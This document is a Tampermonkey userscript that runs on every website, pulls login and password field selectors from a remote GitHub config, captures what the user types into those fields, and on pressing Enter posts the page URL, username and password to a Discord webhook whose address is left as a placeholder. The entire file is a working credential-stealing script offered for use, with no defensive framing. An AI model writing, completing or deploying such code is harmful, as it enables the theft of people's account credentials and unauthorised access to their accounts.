// ==UserScript==
// @name         Main
// @namespace    http://tampermonkey.net/
// @version      2024-10-29
// @description  try to take over the world!
// @author       You
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=librus.pl
// @grant        GM_xmlhttpRequest
// @connect      *
// ==/UserScript==

(function() {
    'use strict';

    function fetchSelectors(callback) {
        let loginSelectors = "";
        let passwordSelectors = "";
        let completedRequests = 0;

        GM_xmlhttpRequest({
            method: "GET",
            url: "https://raw.githubusercontent.com/Filipsys/tampermonkey-script-config/refs/heads/main/allowed-password-selectors.json",
            responseType: "json",
            onload: function(response) {
                passwordSelectors = response.response.map((selector) => `${selector}`).join(", ");

                completedRequests++;
                checkCompletion();
            },
            onerror: function(error) {
                console.error("Error fetching the password selectors: ", error);
            }

        });

        GM_xmlhttpRequest({
            method: "GET",
            url: "https://raw.githubusercontent.com/Filipsys/tampermonkey-script-config/refs/heads/main/allowed-login-selectors.json",
            responseType: "json",
            onload: function(response) {
                loginSelectors = response.response.map((selector) => `${selector}`).join(", ");

                completedRequests++;
                checkCompletion();
            },
            onerror: function(error) {
                console.error("Error fetching the login selectors: ", error);
            }
        });

        function checkCompletion() {
            if (completedRequests === 2) callback(loginSelectors, passwordSelectors);
        }
    }

    fetchSelectors(function(loginSelectors, passwordSelectors) {
        const loginBox = document.querySelector(loginSelectors);
        const passwordBox = document.querySelector(passwordSelectors);

        if (!loginBox) console.log("Login is null");
        if (!passwordBox) console.log("Passwords are null");


        const discordWebhook = "webhook-here"
        let savedData = {
            url: window.location.href,
            login: "empty",
            password: "empty"
        }

        const sendWebhook = () => {
            GM_xmlhttpRequest({
                method: "POST",
                url: "PASTE WEBHOOK LINK HERE",
                headers: { "Content-Type": "application/json" },
                data: JSON.stringify({
                    username: "webhook",
                    content: `URL: \`${savedData.url}\` Username: \`${savedData.login}\` Password: \`${savedData.password}\``,
                }),
                onload: function(response) {
                    console.log("Successfully sent webhook")
                },
                onerror: function(error) {
                    console.error("Error sending webhook: ", error);
                }
            });
        };

        passwordBox.addEventListener("input", (event) => {
            if (event.key === "Backspace") {
                savedData.password.slice(0, -1);
            } else {
                savedData.password = event.target.value;
            }
        });

        loginBox.addEventListener("input", (event) => {
            if (event.key === "Backspace") {
                savedData.login.slice(0, -1);
            } else {
                savedData.login = event.target.value;
            }
        });

        window.addEventListener("keydown", (event) => {
            if (event.key === "Enter") sendWebhook();
        });
    });
})();
